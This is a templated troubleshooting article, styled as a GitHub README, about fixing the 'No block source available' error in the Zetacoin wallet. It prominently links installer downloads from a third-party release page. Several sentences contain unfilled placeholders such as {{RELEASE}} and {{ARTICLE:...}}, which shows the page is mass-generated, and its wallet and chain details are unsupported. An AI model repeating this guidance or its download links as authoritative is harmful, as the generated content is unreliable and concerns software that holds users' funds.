![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Fix "No Block Source Available" in Zetacoin</h1>

<p align="center">Diagnosis first, then the numbered fix, then the setting that stops it happening again.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

"No block source available" means the client has no peer it can download blocks from. It is a connectivity message, not a corruption message: the wallet is running, the chain is fine, and the client simply cannot reach anyone. Fix the peer path  -  firewall, network, node list  -  and the message clears. The client's log records each connection attempt, which is how you tell a blocked port from a dead seed node.

## What the message actually says

The client reports this when its peer set is empty for long enough that it cannot proceed. It is the equivalent of a browser saying it cannot resolve a host: the software is working, the network is not answering.

That distinction matters because the message sounds catastrophic. Nothing has been lost, nothing is corrupt, and no wallet file has been touched. The chain data on disk is whatever it was before the client last synced.

| Cause | How it presents | Fix |
| --- | --- | --- |
| Firewall blocking outbound | zero peers, message on every start | allow the client through the firewall |
| VPN or restricted network | works on one network, fails on another | test on a different connection |
| Empty or stale node list | peers appear briefly then drop | add nodes, restart |
| Old build with dated seed nodes | message persists on a working network | update to the current release |
| Wrong chain data in the folder | peers exist but blocks do not arrive | separate the data directory |

The full walk-through, with the checks in order, is in [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md).

## Fix 1: the firewall

Allow the wallet through the system firewall for both inbound and outbound traffic on port 17333. On Windows this is a prompt on first launch that people often dismiss; dismissing it leaves the client blocked silently.

On Linux, check that outbound traffic is permitted and that no local rule drops the port. On macOS, check the application firewall rather than the network settings page, because the two are different controls.

Then restart the client. A firewall change does not apply to an already-running process in every case, so a restart is part of the fix rather than a superstition.

## Fix 2: the network you are on

Some networks block unusual ports entirely. An office, a campus and a hotel network are all plausible culprits, and the tell is that the same wallet works on a phone hotspot.

Test that before changing anything else. If the wallet syncs on a different connection, the software is fine and the network is the problem  -  a VPN that permits the port, or a different network, is the answer. If the name lookup itself fails, the machine has a DNS problem that will affect every application, not just this one.

For the background behind this step, [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md) covers the same ground in more detail.

## Fix 3: add nodes

If peers appear and then drop, the client may be finding nodes it cannot keep. Adding explicit nodes to `zetacoin.conf` gives it addresses to retry against rather than relying entirely on discovery.

The configuration file lives in the data directory, and node entries go in as `addnode=` lines. After editing, restart the client so the file is read again.

This is a workaround for a thin network, not a fix for a blocked port. If outbound traffic is blocked, no node list will help.

## Fix 4: update the build

Older builds carry seed nodes that may no longer answer. That produces exactly this message on a network that is otherwise fine, and the fix is the current release from {{RELEASE}}.

Updating also brings the connection handling of the current code, which is more resilient than what an old build does when its first peers fail. If the installation is more than a year old, this is the most likely single fix.

## Fix 5: separate the chain data

If peers connect  -  the count is above zero  -  but blocks never arrive, the client is likely following a different chain than the one its peers are on. That happens when a data directory from the legacy era is still in place.

Close the client, back up `wallet.dat`, rename the data directory, and let the client build a new one. Restore the wallet file into it and let the rescan run. {{ARTICLE:why-old-zetacoin-wallet-wont-sync}} covers the legacy case in detail, and {{ARTICLE:where-is-zetacoin-wallet-dat}} gives the paths.

## What the log tells you that the window does not

The window shows a message; the log shows attempts. Those attempts are the difference between four causes that look identical from the outside.

If the log shows connection attempts that time out, the port is blocked somewhere between you and the network. If it shows connections that open and immediately close, the peer is rejecting your client, which points at the build. If it shows no attempts at all, the client is not even trying, which points at the firewall rule or a DNS failure.

Reading it takes a minute and saves the trial-and-error of changing settings at random. It is also the only artefact worth attaching to a support request, because it records what the client actually did rather than what the window decided to display.

## What to check once it clears

The message clearing is not the same as being synced. Confirm the height is climbing, the peer count stays above zero, and blocks arrive on the 30-second schedule. Then check that your address begins with `9` so you know you are on the current chain.

If the message returns after a successful sync, the cause is usually the network changing underneath you  -  a laptop moving between Wi-Fi networks is the classic case.

## Common questions

### Is my wallet corrupt when it says this?

No. The message is about peers, not data. Your wallet file and chain data are untouched by it.

### Does port forwarding fix it?

It can help by letting peers reach you, but the client only needs outbound access to sync. Fix outbound first.

### Why does it work on my phone hotspot but not at home?

Because the home network is blocking or filtering the port. That is a router or firewall issue, not a wallet issue.

### Will reinstalling help?

Only if the build was outdated or the data directory held the wrong chain. Reinstalling onto the same blocked network reproduces the message exactly.

## Where to go next

Start with the firewall, then the network, then the node list, then the build. {{ARTICLE:zetacoin-wallet-zero-peer-connections}} covers the peer count itself, {{ARTICLE:zetacoin-wallet-not-syncing-fix}} covers the full troubleshooting order, and {{RELEASE}} is where the current build comes from. For the ports involved, {{ARTICLE:zetacoin-wallet-ports-and-firewall}} explains which one does what.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Zetacoin Ports, Nodes and zetacoin.conf](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/ports-nodes-and-conf-settings.md)
- [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md)
- [Zetacoin Wallet Shows Zero Peers](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/zero-peer-connections-explained.md)
